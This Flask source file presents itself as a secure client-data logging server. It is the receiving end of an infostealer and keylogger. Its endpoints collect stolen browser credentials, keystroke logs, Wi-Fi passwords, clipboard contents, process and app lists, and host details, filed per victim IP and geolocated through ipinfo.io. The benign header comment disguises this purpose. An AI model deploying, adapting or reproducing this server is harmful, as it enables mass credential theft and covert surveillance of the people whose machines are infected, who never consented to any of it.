# A Flask-based server application that receives, processes, and securely stores client data including credentials, keylogs, IP info, and system details in organized log files.

from flask import Flask, request, jsonify
import threading
import csv
import os
from datetime import datetime
import requests

app = Flask(__name__)
log_lock = threading.Lock()

# Define the directories
DATA_DIR = "logs"
PASSWDS_DIR = "passwds"  # Directory for storing credentials CSV files
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(PASSWDS_DIR, exist_ok=True)  # Create the passwds directory

def get_client_ip():
    return request.remote_addr

def get_file_paths(client_ip):
    sanitized_ip = client_ip.replace(".", "_")
    
    # Adjust the data file path to save the credentials in the 'passwds' folder
    data_file = os.path.join(PASSWDS_DIR, f"{sanitized_ip}_credentials.csv")  # Saved in 'passwds' folder
    keylog_file = os.path.join(DATA_DIR, f"{sanitized_ip}_keylog.txt")
    info_file = os.path.join(DATA_DIR, f"{sanitized_ip}_info.txt")
    sysinfo_file = os.path.join(DATA_DIR, f"{sanitized_ip}_sysinfo.txt")
    wifi_file = os.path.join(DATA_DIR, f"{sanitized_ip}_wifi.txt")
    clipboard_file = os.path.join(DATA_DIR, f"{sanitized_ip}_clipboard.txt")
    apps_file = os.path.join(DATA_DIR, f"{sanitized_ip}_apps.txt")
    processes_file = os.path.join(DATA_DIR, f"{sanitized_ip}_processes.txt")
    
    return data_file, keylog_file, info_file, sysinfo_file, wifi_file, clipboard_file, apps_file, processes_file

def get_ip_info(ip):
    try:
        url = f"https://ipinfo.io/{ip}/json"
        response = requests.get(url)
        print(f"API Response: {response.text}")
        data = response.json()
        return data
    except Exception as e:
        print(f"Error fetching IP info: {str(e)}")
        return {}

@app.route('/save_data', methods=['POST'])
def save_data():
    try:
        client_ip = get_client_ip()
        data_file, _, _, _, _, _, _, _ = get_file_paths(client_ip)

        received_data = request.json.get("data", [])
        if not received_data:
            return jsonify({"error": "No data received"}), 400

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        with log_lock:
            file_exists = os.path.exists(data_file)
            with open(data_file, "a", newline="", encoding="utf-8") as file:
                writer = csv.writer(file)
                if not file_exists:
                    writer.writerow(["Timestamp", "Browser", "URL", "Username", "Password", "User"])

                for entry in received_data:
                    writer.writerow([timestamp, entry["browser"], entry["url"], entry["username"], entry["password"], entry["user"]])

        return jsonify({"message": "Data saved successfully", "client_ip": client_ip}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/save_keylog', methods=['POST'])
def save_keylog():
    try:
        client_ip = get_client_ip()
        _, keylog_file, _, _, _, _, _, _ = get_file_paths(client_ip)

        log_data = request.form.get("log")
        if not log_data:
            return jsonify({"error": "No keylog data received"}), 400

        # Remove unwanted characters and join log_data as a single string
        log_entry = log_data.replace('\n', '').replace('\r', '')  # Remove any newlines

        # Split log_entry into chunks of 100 characters
        chunks = [log_entry[i:i+100] for i in range(0, len(log_entry), 100)]

        # Instead of writing each character to the file line by line, accumulate
        # them into chunks and write each chunk as a new line
        with log_lock:
            with open(keylog_file, "a", encoding="utf-8") as file:
                for chunk in chunks:
                    file.write(chunk + "\n")  # Write each chunk followed by a newline

        return jsonify({"message": "Keylog saved successfully", "client_ip": client_ip}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/save_ip', methods=['POST'])
def save_ip():
    try:
        client_ip = get_client_ip()
        _, _, info_file, _, _, _, _, _ = get_file_paths(client_ip)

        received_data = request.json
        if not received_data:
            return jsonify({"error": "No system info received"}), 400

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        ip_info = get_ip_info(client_ip)

        info_entry = f"--- IP Info ({timestamp}) ---\n"
        for key, value in ip_info.items():
            info_entry += f"{key}: {value}\n"
        info_entry += f"---------------------------\n\n"

        with log_lock:
            with open(info_file, "a", encoding="utf-8") as file:
                file.write(info_entry)

        print(f"\n[+] IP Data from {client_ip} at {timestamp}")
        print(f"  {info_entry}\n")

        return jsonify({"message": "IP info saved successfully", "client_ip": client_ip}), 200

    except Exception as e:
        print(f"Error saving IP info: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/save_sysinfo', methods=['POST'])
def save_sysinfo():
    try:
        client_ip = get_client_ip()
        _, _, _, sysinfo_file, wifi_file, clipboard_file, apps_file, processes_file = get_file_paths(client_ip)

        received_data = request.json
        if not received_data:
            return jsonify({"error": "No system info received"}), 400

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Fetch full IP info
        ip_info = get_ip_info(client_ip)

        # Write system info along with IP info
        sysinfo_entry = (
            f"--- System Info ({timestamp}) ---\n"
            f"Hostname: {received_data.get('hostname', 'Unknown')}\n"
            f"Username: {received_data.get('username', 'Unknown')}\n"
            f"OS: {received_data.get('os', 'Unknown')}\n"
            f"CPU: {received_data.get('cpu', 'Unknown')}\n"
            f"RAM: {received_data.get('ram', 'Unknown')}\n"
            f"\n--- IP Info from ipinfo.io ---\n"
        )

        # Add all IP information to the sysinfo entry
        for key, value in ip_info.items():
            sysinfo_entry += f"{key}: {value}\n"

        sysinfo_entry += f"-------------------------------\n\n"

        # Save additional data: Wi-Fi passwords, clipboard, installed apps, running processes
        if "wifi_passwords" in received_data:
            with open(wifi_file, "a", encoding="utf-8") as file:
                for wifi in received_data["wifi_passwords"]:
                    file.write(f"SSID: {wifi['SSID']}, Password: {wifi['Password']}\n")
        if "clipboard" in received_data:
            with open(clipboard_file, "a", encoding="utf-8") as file:
                file.write(f"Clipboard: {received_data['clipboard']}\n")
        if "installed_apps" in received_data:
            with open(apps_file, "a", encoding="utf-8") as file:
                for app in received_data["installed_apps"]:
                    file.write(f"{app}\n")
        if "running_processes" in received_data:
            with open(processes_file, "a", encoding="utf-8") as file:
                for process in received_data["running_processes"]:
                    file.write(f"{process['pid']} - {process['name']}\n")

        with log_lock:
            with open(sysinfo_file, "a", encoding="utf-8") as file:
                file.write(sysinfo_entry)

        print(f"\n[+] System Info from {client_ip} at {timestamp}")
        print(f"  Hostname: {received_data.get('hostname', 'Unknown')}")
        print(f"  Username: {received_data.get('username', 'Unknown')}")
        print(f"  OS: {received_data.get('os', 'Unknown')}")
        print(f"  CPU: {received_data.get('cpu', 'Unknown')}")
        print(f"  RAM: {received_data.get('ram', 'Unknown')}")
        print(f"  IP Info: {ip_info}\n")

        return jsonify({"message": "System info saved successfully", "client_ip": client_ip}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=4118)